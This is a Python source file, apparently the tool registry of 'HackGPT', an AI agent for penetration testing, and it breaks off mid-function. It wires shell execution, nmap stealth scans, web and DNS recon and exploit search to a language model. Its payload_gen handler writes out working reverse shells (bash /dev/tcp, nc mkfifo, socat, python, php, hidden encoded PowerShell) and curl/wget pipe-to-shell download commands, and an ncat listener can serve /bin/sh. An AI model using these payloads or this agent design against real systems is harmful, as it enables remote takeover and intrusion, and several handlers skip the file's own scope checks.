"""HackGPT tool registry.

Each tool is an OpenAI function schema plus a handler. Handlers receive the
parsed argument dict and a Ctx, mutate session state, and return a string that
is fed back to the model. Scope-restricted tools call require_scope() first.
"""
from __future__ import annotations

import base64
import calendar
import codecs
import dataclasses
import ipaddress
import json
import os
import re
import shlex
import socket
import subprocess
import time
import typing as t
import urllib.error
import urllib.parse
import urllib.request

from . import config as C
from .msfrpc import MsfRpcClient, RpcError
from .report import render_markdown

if t.TYPE_CHECKING:  # pragma: no cover
    from dataclasses import dataclass
    from .ui import Console


class ToolError(RuntimeError):
    pass


def clip(text: str, limit: int = 6000) -> str:
    text = text or ""
    if len(text) <= limit:
        return text
    head = limit * 2 // 3
    tail = limit - head
    return text[:head] + f"\n... [clipped {len(text) - limit} chars] ...\n" + text[-tail:]


def _ts() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%S")


@dataclasses.dataclass
class Ctx:
    config: dict
    session: dict
    console: t.Any
    workdir: str
    output_dir: str
    dry_run: bool = False


# --------------------------------------------------------------------------
# shell
# --------------------------------------------------------------------------

def h_shell(args: dict, ctx: Ctx) -> str:
    cmd = str(args.get("command", "")).strip()
    if not cmd:
        raise ToolError("shell: 'command' is required")
    timeout = int(args.get("timeout") or ctx.config.get("timeout_default", 90))

    if ctx.config.get("confirm_shell") and not ctx.console.confirm(f"Run: {cmd}"):
        return "cancelled by operator"
    if ctx.dry_run:
        return f"[dry-run] would run: {cmd}"

    ctx.console.log_action("shell", cmd)
    try:
        proc = subprocess.run(
            cmd, shell=True, cwd=ctx.workdir,
            capture_output=True, text=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        ctx.session["actions"].append({"tool": "shell", "cmd": cmd, "rc": "timeout", "ts": _ts()})
        return f"$ {cmd}\n[timeout after {timeout}s]"
    except Exception as exc:  # noqa: BLE001
        return f"$ {cmd}\n[error] {exc}"

    out = (proc.stdout or "") + (proc.stderr or "")
    ctx.session["actions"].append(
        {"tool": "shell", "cmd": cmd, "rc": proc.returncode, "ts": _ts(), "bytes": len(out)}
    )
    return clip(f"$ {cmd}\nrc={proc.returncode}\n{out}")


# --------------------------------------------------------------------------
# nmap
# --------------------------------------------------------------------------

NMAP_PROFILES: dict[str, list[str]] = {
    "quick":    ["-T4", "-F", "--open", "--max-retries", "1", "--host-timeout", "5m"],
    "top100":   ["-T4", "--top-ports", "100", "--open", "--max-retries", "1", "--host-timeout", "5m"],
    "full":     ["-T4", "-p-", "--open", "-sV", "--max-retries", "1", "--host-timeout", "15m"],
    "service":  ["-T4", "-sV", "-sC", "--open", "--max-retries", "1", "--host-timeout", "10m"],
    "vuln":     ["-T4", "-sV", "--script=vuln", "--open", "--host-timeout", "15m"],
    "stealth":  ["-T2", "-sS", "-Pn", "-f", "--data-length", "24", "--max-retries", "2", "--host-timeout", "10m"],
    "udp":      ["-sU", "--top-ports", "100", "--open", "--host-timeout", "10m"],
}

_NMAP_PORT = re.compile(r"^(\d+/\w+)[ \t]+open[ \t]+(\S+)(?:[ \t]+(\S+))?", re.MULTILINE)


def h_nmap(args: dict, ctx: Ctx) -> str:
    target = str(args.get("target", "")).strip()
    if not target:
        raise ToolError("nmap_scan: 'target' is required")
    C.require_scope(ctx.config, target)
    profile = str(args.get("profile") or "quick").lower()
    if profile not in NMAP_PROFILES:
        raise ToolError(f"nmap_scan: unknown profile '{profile}' (choose {', '.join(NMAP_PROFILES)})")
    ports = str(args.get("ports", "")).strip()
    extra = str(args.get("extra", "")).strip()
    timeout = int(args.get("timeout") or 900)

    nmap = ctx.config.get("nmap", "nmap")
    cmd = [nmap, *NMAP_PROFILES[profile]]
    if ports:
        cmd += ["-p", ports]
    if extra:
        cmd += shlex.split(extra)
    cmd.append(target)

    pretty = " ".join(cmd)
    if ctx.dry_run:
        return f"[dry-run] would scan: {pretty}"
    ctx.console.log_action("nmap", f"{profile} {target}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except FileNotFoundError:
        raise ToolError("nmap_scan: nmap binary not found") from None
    except subprocess.TimeoutExpired:
        return f"$ {pretty}\n[timeout after {timeout}s]"

    out = (proc.stdout or "") + (proc.stderr or "")
    open_ports = []
    for m in _NMAP_PORT.finditer(out):
        open_ports.append({"port": m.group(1), "service": m.group(2), "version": m.group(3) or ""})
    if open_ports:
        ctx.session["targets"].append(
            {"target": target, "profile": profile, "open_ports": open_ports, "ts": _ts()}
        )
    ctx.session["actions"].append(
        {"tool": "nmap", "target": target, "profile": profile, "ports": len(open_ports), "ts": _ts()}
    )
    summary = "\n".join(f"  {p['port']:>10}  {p['service']:<14} {p['version']}" for p in open_ports[:40])
    body = summary or out.strip()
    return clip(f"$ {pretty}\nrc={proc.returncode}\n--- open ports ---\n{body}\n--- raw tail ---\n{out[-1500:]}")


# --------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------

def _http_client(ctx: Ctx, timeout: float, follow: bool):
    import httpx

    headers = {"User-Agent": ctx.config.get("user_agent", "HackGPT/1.0")}
    return httpx.Client(timeout=timeout, follow_redirects=follow, headers=headers, verify=False)


def h_http_probe(args: dict, ctx: Ctx) -> str:
    url = str(args.get("url", "")).strip()
    if not url:
        raise ToolError("http_probe: 'url' is required")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    C.require_scope(ctx.config, url)
    method = str(args.get("method") or "GET").upper()
    follow = bool(args.get("follow", True))
    timeout = float(args.get("timeout") or 20)

    if ctx.dry_run:
        return f"[dry-run] would {method} {url}"

    ctx.console.log_action("http_probe", f"{method} {url}")
    try:
        with _http_client(ctx, timeout, follow) as cli:
            resp = cli.request(method, url)
    except Exception as exc:  # noqa: BLE001
        return f"{method} {url} -> [error] {exc}"

    body = resp.text or ""
    title = ""
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.IGNORECASE | re.DOTALL)
    if m:
        title = re.sub(r"\s+", " ", m.group(1)).strip()[:200]
    headers = {k: v for k, v in resp.headers.items() if k.lower() in
               ("server", "x-powered-by", "content-type", "content-length",
                "set-cookie", "location", "x-aspnet-version", "via")}
    ctx.session["actions"].append({"tool": "http_probe", "url": url, "status": resp.status_code, "ts": _ts()})
    lines = [
        f"{method} {url} -> {resp.status_code} {resp.reason_phrase} ({len(body)} bytes, {len(resp.headers)} headers)",
        f"title: {title or '-'}",
        "interesting headers:",
    ]
    lines += [f"  {k}: {v[:200]}" for k, v in headers.items()]
    return "\n".join(lines)


def h_web_vuln_scan(args: dict, ctx: Ctx) -> str:
    url = str(args.get("url", "")).strip()
    if not url:
        raise ToolError("web_vuln_scan: 'url' is required")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    C.require_scope(ctx.config, url)
    checks = str(args.get("checks") or "headers,methods,paths,cors,tech").lower()
    do = set(x.strip() for x in checks.split(",") if x.strip())
    timeout = float(args.get("timeout") or 20)
    base = "{0.scheme}://{0.netloc}".format(urllib.parse.urlparse(url))

    if ctx.dry_run:
        return f"[dry-run] would run web checks ({checks}) on {url}"

    ctx.console.log_action("web_vuln_scan", url)
    findings: list[str] = []
    try:
        with _http_client(ctx, timeout, True) as cli:
            if "headers" in do or "tech" in do:
                r = cli.get(url)
                hdrs = {k.lower(): v for k, v in r.headers.items()}
                if "tech" in do:
                    tech = [f"{k}={hdrs[k][:120]}" for k in ("server", "x-powered-by", "x-aspnet-version", "via") if k in hdrs]
                    findings.append("tech: " + (", ".join(tech) if tech else "none disclosed"))
                if "headers" in do:
                    missing = [h for h in ("x-content-type-options", "x-frame-options", "content-security-policy",
                                           "strict-transport-security", "referrer-policy", "permissions-policy")
                               if h not in hdrs]
                    if missing:
                        findings.append("missing security headers: " + ", ".join(missing))
                    if "access-control-allow-origin" in hdrs:
                        findings.append(f"CORS header present: ACAO={hdrs['access-control-allow-origin']}")
            if "methods" in do:
                try:
                    o = cli.options(url)
                    allow = o.headers.get("allow", "")
                    findings.append(f"OPTIONS -> {o.status_code} allow={allow or '-'}")
                except Exception as exc:  # noqa: BLE001
                    findings.append(f"OPTIONS failed: {exc}")
            if "cors" in do:
                try:
                    r = cli.get(url, headers={"Origin": "https://evil.example"})
                    acao = r.headers.get("access-control-allow-origin", "")
                    if acao:
                        findings.append(f"reflected Origin -> ACAO={acao} (verify with allowed origins)")
                except Exception as exc:  # noqa: BLE001
                    findings.append(f"CORS probe failed: {exc}")
            if "paths" in do:
                paths = ["/robots.txt", "/.git/config", "/.env", "/admin", "/login", "/swagger/index.html",
                         "/api", "/api/v1", "/server-status", "/phpmyadmin", "/wp-login.php",
                         "/actuator/health", "/.well-known/security.txt"]
                hits = []
                for p in paths:
                    try:
                        pr = cli.get(base + p, timeout=8)
                        if pr.status_code not in (404, 403, 401, 400, 500, 502, 503):
                            hits.append(f"{p} -> {pr.status_code} ({len(pr.content)}b)")
                    except Exception:  # noqa: BLE001
                        continue
                if hits:
                    findings.append("interesting paths:\n  " + "\n  ".join(hits))
    except Exception as exc:  # noqa: BLE001
        return f"web_vuln_scan: {exc}"

    ctx.session["actions"].append({"tool": "web_vuln_scan", "url": url, "ts": _ts()})
    return "\n".join(findings) if findings else "no obvious issues from the selected checks"


# --------------------------------------------------------------------------
# DNS / subdomains
# --------------------------------------------------------------------------

def _run(cmd: list[str], timeout: int = 30) -> str:
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as exc:  # noqa: BLE001
        return f"[error] {exc}"


def h_dns_recon(args: dict, ctx: Ctx) -> str:
    domain = str(args.get("domain", "")).strip()
    if not domain:
        raise ToolError("dns_recon: 'domain' is required")
    domain = C.normalize_target(domain) or domain
    C.require_scope(ctx.config, domain)
    types = str(args.get("types") or "A,AAAA,CNAME,MX,NS,TXT,SOA")
    ctx.console.log_action("dns_recon", domain)
    if ctx.dry_run:
        return f"[dry-run] would resolve {types} for {domain}"
    out: list[str] = []
    for rtype in [t.strip().upper() for t in types.split(",") if t.strip()]:
        if C.which("dig"):
            res = _run(["dig", "+noall", "+answer", "+time=3", domain, rtype])
        elif C.which("nslookup"):
            res = _run(["nslookup", "-type=" + rtype, domain])
        elif rtype in ("A", "AAAA"):
            try:
                infos = socket.getaddrinfo(domain, None)
                ips = sorted({i[4][0] for i in infos})
                res = "\n".join(f"{domain}. IN {rtype} {ip}" for ip in ips) or "no address"
            except Exception as exc:  # noqa: BLE001
                res = f"[resolver error] {exc}"
        else:
            res = "[no dig/nslookup available — install dnsutils for this record type]"
        res = res.strip()
        if res:
            out.append(f"[{rtype}]\n{res}")
    if C.which("whois"):
        w = _run(["whois", domain], timeout=25).strip()
        if w:
            keep = [ln for ln in w.splitlines()
                    if re.search(r"(registrar|creation|expiry|updated|name server|status|Registrant)", ln, re.I)]
            if keep:
                out.append("[whois]\n" + "\n".join(keep[:20]))
    ctx.session["actions"].append({"tool": "dns_recon", "domain": domain, "ts": _ts()})
    return clip("\n\n".join(out) if out else "no DNS records returned")


def h_subdomain_enum(args: dict, ctx: Ctx) -> str:
    domain = str(args.get("domain", "")).strip()
    if not domain:
        raise ToolError("subdomain_enum: 'domain' is required")
    domain = C.normalize_target(domain) or domain
    C.require_scope(ctx.config, domain)
    source = str(args.get("source") or "all").lower()
    ctx.console.log_action("subdomain_enum", domain)
    if ctx.dry_run:
        return f"[dry-run] would enumerate subdomains of {domain} ({source})"
    found: set[str] = set()
    if source in ("all", "crtsh"):
        try:
            url = f"https://crt.sh/?q=%25.{urllib.parse.quote(domain)}&output=json"
            with urllib.request.urlopen(url, timeout=30) as r:
                data = json.loads(r.read().decode("utf-8", "replace"))
            for row in data:
                for name in str(row.get("name_value", "")).splitlines():
                    name = name.strip().lstrip("*.")
                    if name and " " not in name:
                        found.add(name.lower())
        except Exception as exc:  # noqa: BLE001
            found.add(f"[crt.sh error: {exc}]")
    if source in ("all", "hackertarget"):
        res = _run([ctx.config.get("curl", "curl"), "-s",
                    f"https://api.hackertarget.com/hostsearch/?q={urllib.parse.quote(domain)}"], timeout=30)
        for line in res.splitlines():
            if "," in line:
                sub = line.split(",", 1)[0].strip().lower()
                if sub and " " not in sub:
                    found.add(sub)
    subs = sorted(x for x in found
                  if not x.startswith("[") and (x == domain or x.endswith("." + domain)))
    errs = [x for x in found if x.startswith("[")]
    if subs:
        ctx.session["targets"].append({"target": domain, "subdomains": subs, "ts": _ts()})
    ctx.session["actions"].append({"tool": "subdomain_enum", "domain": domain, "count": len(subs), "ts": _ts()})
    return clip(f"{len(subs)} subdomains for {domain}:\n" + "\n".join(subs) + ("\n" + "\n".join(errs) if errs else ""))


# --------------------------------------------------------------------------
# CVE / exploit research
# --------------------------------------------------------------------------

_NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
_CVEAWG_API = "https://cveawg.mitre.org/api/cve"
_NVD_MIN_GAP = 1.0  # NVD's unauthenticated limit is 5 requests / 30s; backoff handles bursts
_last_nvd_call = 0.0


def _http_get_json(url: str, timeout: int = 30):
    req = urllib.request.Request(url, headers={"User-Agent": "HackGPT/1.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8", "replace"))


def _nvd_get(params: dict, timeout: int = 30) -> dict:
    """GET NVD 2.0 with light client-side spacing and backoff on rate limits."""
    global _last_nvd_call
    url = _NVD_API + "?" + urllib.parse.urlencode(params)
    for attempt in range(3):
        gap = time.monotonic() - _last_nvd_call
        if gap < _NVD_MIN_GAP:
            time.sleep(_NVD_MIN_GAP - gap)
        try:
            data = _http_get_json(url, timeout=timeout)
            _last_nvd_call = time.monotonic()
            return data
        except urllib.error.HTTPError as exc:
            _last_nvd_call = time.monotonic()
            if exc.code in (403, 429) and attempt < 2:
                time.sleep(7)
                continue
            raise
    return {}


def _nvd_row(cve: dict) -> dict:
    """Normalize an NVD 2.0 CVE object into the flat fields the tools report."""
    desc = ""
    for d in cve.get("descriptions") or []:
        if str(d.get("lang", "")).lower() == "en":
            desc = str(d.get("value", ""))
            break
    if not desc:
        for d in cve.get("descriptions") or []:
            desc = str(d.get("value", ""))
            break
    score = sev = ""
    metrics = cve.get("metrics") or {}
    for key in ("cvssMetricV40", "cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
        entries = metrics.get(key) or []
        if entries:
            cvss = entries[0].get("cvssData") or {}
            score = cvss.get("baseScore", "")
            sev = cvss.get("baseSeverity") or entries[0].get("baseSeverity", "")
            break
    refs = [str(r.get("url", "")) for r in (cve.get("references") or []) if r.get("url")]
    return {
        "id": cve.get("id", ""),
        "summary": desc,
        "cvss": score,
        "severity": sev,
        "published": cve.get("published", ""),
        "refs": refs,
    }


def _cveawg_row(data: dict) -> dict:
    """Parse the official CVE Program (CVE 5.1) record shape."""
    meta = data.get("cveMetadata") or {}
    cna = ((data.get("containers") or {}).get("cna") or {})
    desc = ""
    for d in cna.get("descriptions") or []:
        if str(d.get("lang", "")).lower() == "en":
            desc = str(d.get("value", ""))
            break
    score = sev = ""
    for m in cna.get("metrics") or []:
        for key in ("cvssV4_0", "cvssV3_1", "cvssV3_0", "cvssV2_0"):
            entry = m.get(key)
            if entry:
                score = entry.get("baseScore", "")
                sev = entry.get("baseSeverity", "")
                break
        if score != "":
            break
    refs = [str(r.get("url", "")) for r in (cna.get("references") or [])
            if isinstance(r, dict) and r.get("url")]
    return {
        "id": meta.get("cveId", ""),
        "summary": desc or str(cna.get("title", "")),
        "cvss": score,
        "severity": sev,
        "published": meta.get("datePublished", ""),
        "refs": refs,
    }


def _format_cve(row: dict) -> str:
    lines = [
        f"{row['id']}: {row['summary'][:600]}",
        f"CVSS: {row['cvss'] or 'n/a'}  Severity: {row['severity'] or 'n/a'}  Published: {row['published']}",
    ]
    if row["refs"]:
        lines.append("refs: " + ", ".join(row["refs"][:8]))
    return "\n".join(lines)


def h_cve_lookup(args: dict, ctx: Ctx) -> str:
    q = str(args.get("query", "")).strip()
    if not q:
        raise ToolError("cve_lookup: 'query' is required")
    ctx.console.log_action("cve_lookup", q)
    try:
        if re.match(r"(?i)^cve-\d{4}-\d+$", q):
            data = _nvd_get({"cveId": q.upper()})
            vulns = data.get("vulnerabilities") or []
            if vulns:
                return _format_cve(_nvd_row(vulns[0].get("cve") or {}))
            # NVD may lag brand-new IDs; fall back to the official CVE Program API.
            try:
                rec = _http_get_json(f"{_CVEAWG_API}/{q.upper()}")
                if rec.get("cveMetadata"):
                    return _format_cve(_cveawg_row(rec))
            except Exception:  # noqa: BLE001
                pass
            return f"no CVE record found for '{q}'"
        data = _nvd_get({"keywordSearch": q, "resultsPerPage": 15})
        vulns = data.get("vulnerabilities") or []
        if not vulns:
            return f"no CVEs matched '{q}'"
        rows = [_nvd_row(v.get("cve") or {}) for v in vulns[:15]]
        out = [f"{r['id']}  cvss={r['cvss'] or 'n/a'}  {r['summary'][:140]}" for r in rows]
        return f"{data.get('totalResults', len(vulns))} total matches for '{q}':\n" + "\n".join(out)
    except Exception as exc:  # noqa: BLE001
        return f"cve_lookup failed: {exc}"


def h_exploit_search(args: dict, ctx: Ctx) -> str:
    q = str(args.get("query", "")).strip()
    if not q:
        raise ToolError("exploit_search: 'query' is required")
    ctx.console.log_action("exploit_search", q)
    out: list[str] = []
    if C.which("searchsploit"):
        res = _run(["searchsploit", "--color", "-w", q], timeout=40)
        if res.strip():
            out.append("[searchsploit]\n" + res.strip()[:3000])
    try:
        data = _nvd_get({"keywordSearch": q, "resultsPerPage": 5})
        vulns = data.get("vulnerabilities") or []
        if vulns:
            rows = [_nvd_row(v.get("cve") or {}) for v in vulns[:5]]
            out.append(f"CVEs related to '{q}' (fetch exploits from Exploit-DB / GitHub):\n" +
                       "\n".join(f"{r['id']}  {r['summary'][:120]}" for r in rows))
    except Exception:  # noqa: BLE001
        pass
    if not out:
        out.append("no local exploit DB and no CVE matches; install exploitdb (`pkg install exploitdb` if "
                   "available) or search Exploit-DB online. Provide a CVE id for references.")
    return clip("\n\n".join(out))

# --------------------------------------------------------------------------
# payloads
# --------------------------------------------------------------------------

def h_payload_gen(args: dict, ctx: Ctx) -> str:
    ptype = str(args.get("type") or "bash").lower()
    lhost = str(args.get("lhost", "")).strip()
    lport = str(args.get("lport", "")).strip()
    if not lhost or not lport:
        raise ToolError("payload_gen: 'lhost' and 'lport' are required")
    output = str(args.get("output", "")).strip()

    payloads: dict[str, str] = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "nc": f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} >/tmp/f",
        "nc-e": f"nc -e /bin/sh {lhost} {lport}",
        "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/sh,pty,stderr",
        "awk": (f"awk 'BEGIN {{s=\"/inet/tcp/0/{lhost}/{lport}\"; "
                f"while(1){{ printf \"sh\" |& s; while((s |& getline c) > 0) print c |& s; close(s) }}}}'"),
        "python": ("python3 -c 'import socket,subprocess,os;"
                   f"s=socket.socket();s((\"{lhost}\",{lport}));"
                   "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                   "subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "python-pty": ("python3 -c 'import socket,pty,os;"
                       f"s=socket.socket();s((\"{lhost}\",{lport}));"
                       "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                       "pty.spawn(\"/bin/sh\")'"),
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": ("powershell -nop -w hidden -enc " +
                       base64.b64encode(
                           ("$c=New-Object Net.Sockets.TcpClient('{h}',{p});$s=$c.GetStream();"
                            "[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                            "$r=(iex $d 2>&1 | Out-String);$s.Write([Text.Encoding]::ASCII.GetBytes($r),0,$r.Length)}}"
                            ).replace("{h}", lhost).replace("{p}", lport).encode("utf-16-le")).decode()),
        "download": f"curl -fsSL http://{lhost}/payload.sh | sh",
        "download-wget": f"q=wget -qO- http://{lhost}/payload.sh | sh",
    }
    if ptype not in payloads:
        raise ToolError(f"payload_gen: unknown type '{ptype}' (choose {', '.join(payloads)})")

    payload = payloads[ptype]
    if args.get("base64"):
        payload = base64.b64encode(payload.encode()).decode()
        ptype += "+b64"

    ctx.console.log_action("payload_gen", f"{ptype} {lhost}:{lport}")
    ctx.session["actions"].append({"tool": "payload_gen", "type": ptype, "lhost": lhost, "lport": lport, "ts": _ts()})

    if output:
        path = output if os.path.isabs(output) else os.path.join(ctx.output_dir, output)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(payload + "\n")
        os.chmod(path, 0o700)
        ctx.session["artifacts"].append(path)
        return f"[{ptype}] {lhost}:{lport}\n{payload}\n\nsaved -> {path}"
    return f"[{ptype}] {lhost}:{lport}\n{payload}"


# --------------------------------------------------------------------------
# listener
# --------------------------------------------------------------------------

def h_listener(args: dict, ctx: Ctx) -> str:
    action = str(args.get("action") or "start").lower()
    lport = int(args.get("lport") or 4444)
    proto = str(args.get("proto") or "tcp").lower()
    if action not in ("start", "stop"):
        raise ToolError("listener: action must be start|stop")
    ncat = ctx.config.get("ncat", "ncat")
    if not C.which(ncat):
        raise ToolError("listener: ncat not found")

    running = ctx.session.setdefault("listeners", {})
    if action == "stop":
        rec = running.pop(str(lport), None)
        if rec:
            try:
                os.kill(int(rec["pid"]), 15)
            except ProcessLookupError:
                pass
            return f"stopped listener on {lport} (pid {rec['pid']})"
        return f"no listener recorded on {lport}"

    if str(lport) in running:
        return f"listener already recorded on {lport} (pid {running[str(lport)]['pid']})"
    if ctx.dry_run:
        return f"[dry-run] would start ncat listener on 0.0.0.0:{lport}"
    logpath = os.path.join(ctx.workdir, f"listener-{lport}.log")
    proc = subprocess.Popen(
        [ncat, "-lk", "-p", str(lport), "-e", "/bin/sh"] if proto == "exec" else [ncat, "-lk", "-p", str(lport)],
        stdout=open(logpath, "ab"), stderr=subprocess.STDOUT,
        cwd=ctx.workdir, start_new_session=True,
    )
    running[str(lport)] = {"pid": proc.pid, "proto": proto, "ts": _ts()}
    ctx.console.log_action("listener", f"start {lport}/{proto}")
    return f"ncat listener started on 0.0.0.0:{lport} (pid {proc.pid}, log {logpath})"


# --------------------------------------------------------------------------
# session bookkeeping
# --------------------------------------------------------------------------

def h_note(args: dict, ctx: Ctx) -> str:
    text = str(args.get("text", "")).strip()
    if not text:
        raise ToolError("note: 'text' is required")
    category = str(args.get("category") or "finding").lower()
    entry = {"category": category, "text": text, "ts": _ts()}
    if args.get("evidence"):
        entry["evidence"] = str(args.get("evidence"))[:1000]
    ctx.session.setdefault("findings", []).append(entry)
    if category == "credential" and args.get("host"):
        ctx.session.setdefault("credentials", []).append(
            {"host": str(args.get("host")), "text": text, "ts": entry["ts"]})
    ctx.console.log_action("note", f"[{category}] {text[:80]}")
    return f"recorded ({category}): {text[:120]}"


def h_scope(args: dict, ctx: Ctx) -> str:
    action = str(args.get("action") or "list").lower()
    target = str(args.get("target", "")).strip()
    scope = ctx.config.setdefault("scope", [])
    if action == "list":
        if not scope:
            return "scope is empty. Add authorized targets with: scope add <host|ip|cidr|domain>"
        return "authorized scope:\n" + "\n".join(f"  - {e if isinstance(e,str) else e.get('target')}" for e in scope)
    if action == "add":
        if not target:
            raise ToolError("scope add: 'target' is required")
        if any((e if isinstance(e, str) else e.get("target")) == target for e in scope):
            return f"'{target}' already in scope"
        entry = {"target": target, "added": _ts()}
        if args.get("note"):
            entry["note"] = str(args.get("note"))
        scope.append(entry)
        C.save_config(ctx.config)
        return f"added to scope: {target}"
    if action == "remove":
        if not target:
            raise ToolError("scope remove: 'target' is required")
        before = len(scope)
        ctx.config["scope"] = [e for e in scope
                               if (e if isinstance(e, str) else e.get("target")) != target]
        C.save_config(ctx.config)
        return f"removed {before - len(ctx.config['scope'])} entr(ies) for {target}"
    if action == "check":
        if not target:
            raise ToolError("scope check: 'target' is required")
        return f"{target}: {'IN scope' if C.target_in_scope(target, scope) else 'OUT of scope'}"
    raise ToolError("scope: action must be list|add|remove|check")


def h_file_write(args: dict, ctx: Ctx) -> str:
    path = str(args.get("path", "")).strip()
    content = str(args.get("content", ""))
    if not path:
        raise ToolError("file_write: 'path' is required")
    if not os.path.isabs(path):
        path = os.path.join(ctx.output_dir, path)
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    ctx.session["artifacts"].append(path)
    ctx.console.log_action("file_write", f"{path} ({len(content)}b)")
    return f"wrote {len(content)} bytes -> {path}"


def h_report(args: dict, ctx: Ctx) -> str:
    action = str(args.get("action") or "show").lower()
    path = str(args.get("path", "")).strip()
    if action in ("show",):
        return render_markdown(ctx.session, ctx.config)
    if action in ("save", "export"):
        if not path:
            path = os.path.join(ctx.output_dir, f"report-{ctx.session['name']}.md")
        if not os.path.isabs(path):
            path = os.path.join(ctx.output_dir, path)
        md = render_markdown(ctx.session, ctx.config)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(md)
        ctx.session["artifacts"].append(path)
        return f"report saved -> {path}\n\n{md[:1500]}"
    raise ToolError("report: action must be show|save|export")


# --------------------------------------------------------------------------
# utilities: encoding, hash identification
# --------------------------------------------------------------------------

CODECS = ("base64", "hex", "url", "rot13", "jwt")


def _b64decode(s: str) -> bytes:
    s = s.strip()
    s += "=" * (-len(s) % 4)
    try:
        return base64.b64decode(s, validate=False)
    except Exception:  # noqa: BLE001
        return base64.urlsafe_b64decode(s)


def h_encode(args: dict, ctx: Ctx) -> str:
    data = str(args.get("input", ""))
    op = str(args.get("op") or "encode").lower()
    codec = str(args.get("codec") or "base64").lower()
    if op not in ("encode", "decode"):
        raise ToolError("encode: op must be encode|decode")
    if codec not in CODECS:
        raise ToolError(f"encode: unknown codec '{codec}' (choose {', '.join(CODECS)})")
    ctx.console.log_action("encode", f"{codec}/{op}")
    ctx.session["actions"].append({"tool": "encode", "codec": codec, "op": op, "ts": _ts()})

    if codec == "jwt":
        if op == "encode":
            raise ToolError("encode: jwt supports decode only (header/payload, no signature verification)")
        parts = data.strip().split(".")
        if len(parts) != 3:
            raise ToolError("encode: not a JWT — expected 3 dot-separated segments")

        def _d(seg: str) -> str:
            seg += "=" * (-len(seg) % 4)
            return base64.urlsafe_b64decode(seg.encode("utf-8")).decode("utf-8", "replace")

        return f"header: {_d(parts[0])}\npayload: {_d(parts[1])}\nsignature: {parts[2][:48]}..."

    if codec == "base64":
        if op == "encode":
            return base64.b64encode(data.encode("utf-8")).decode("ascii")
        try:
            return _b64decode(data).decode("utf-8", "replace")
        except Exception as exc:  # noqa: BLE001
            raise ToolError(f"encode: base64 decode failed: {exc}") from exc

    if codec == "hex":
        if op == "encode":
            return data.encode("utf-8").hex()
        try:
            return bytes.fromhex("".join(data.split())).decode("utf-8", "replace")
        except Exception as exc:  # noqa: BLE001
            raise ToolError(f"encode: hex decode failed: {exc}") from exc

    if codec == "url":
        if op == "encode":
            return urllib.parse.quote(data, safe="")
        return urllib.parse.unquote_plus(data)

    return codecs.encode(data, "rot_13")  # rot13 is symmetric


_HASH_PATTERNS: list[tuple[str, list[str]]] = [
    (r"^\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}$", ["bcrypt"]),
    (r"^\$argon2(id|i|d)\$", ["argon2"]),
    (r"^\$6\$[./A-Za-z0-9]{0,16}\$[./A-Za-z0-9]{86}$", ["sha512crypt (Linux)"]),
    (r"^\$5\$[./A-Za-z0-9]{0,16}\$[./A-Za-z0-9]{43}$", ["sha256crypt (Linux)"]),
    (r"^\$1\$[./A-Za-z0-9]{0,16}\$[./A-Za-z0-9]{22}$", ["md5crypt (Linux)"]),
    (r"^\$P\$[./A-Za-z0-9]{31}$", ["phpass (WordPress)"]),
    (r"^\$H\$[./A-Za-z0-9]{31}$", ["phpass (phpBB)"]),
    (r"^\*[0-9a-fA-F]{40}$", ["MySQL 4.x/5 (SHA1 x2)"]),
    (r"^[0-9a-fA-F]{16}$", ["MySQL 3.x / DES-crypt"]),
    (r"^[0-9a-fA-F]{32}$", ["MD5", "NTLM", "MD4"]),
    (r"^[0-9a-fA-F]{40}$", ["SHA1", "RIPEMD-160"]),
    (r"^[0-9a-fA-F]{56}$", ["SHA224"]),
    (r"^[0-9a-fA-F]{64}$", ["SHA256", "SHA3-256", "BLAKE2s"]),
    (r"^[0-9a-fA-F]{96}$", ["SHA384"]),
    (r"^[0-9a-fA-F]{128}$", ["SHA512", "SHA3-512", "BLAKE2b"]),
]


def h_hash_info(args: dict, ctx: Ctx) -> str:
    h = str(args.get("hash", "")).strip()
    if not h:
        raise ToolError("hash_info: 'hash' is required")
    hits: list[str] = []
    for pat, names in _HASH_PATTERNS:
        if re.search(pat, h):
            hits.extend(names)
    ctx.session["actions"].append({"tool": "hash_info", "hash": h[:64], "ts": _ts()})
    if not hits:
        return f"no known format matched (len={len(h)}); not enough structure to identify"
    return f"length={len(h)}  possible: " + ", ".join(dict.fromkeys(hits))


# --------------------------------------------------------------------------
# utilities: IP intel, TLS, directory probing
# --------------------------------------------------------------------------

def h_ip_info(args: dict, ctx: Ctx) -> str:
    target = str(args.get("target", "")).strip()
    if not target:
        raise ToolError("ip_info: 'target' is required")
    host = C.normalize_target(target)
    label = target
    try:
        net = ipaddress.ip_network(target, strict=False)
    except ValueError:
        net = None
    if net is not None:
        host = str(net.network_address)
        label = f"{target} -> network {host}/{net.prefixlen}"
    C.require_scope(ctx.config, host)
    ctx.console.log_action("ip_info", label)
    if ctx.dry_run:
        return f"[dry-run] would look up {label}"
    try:
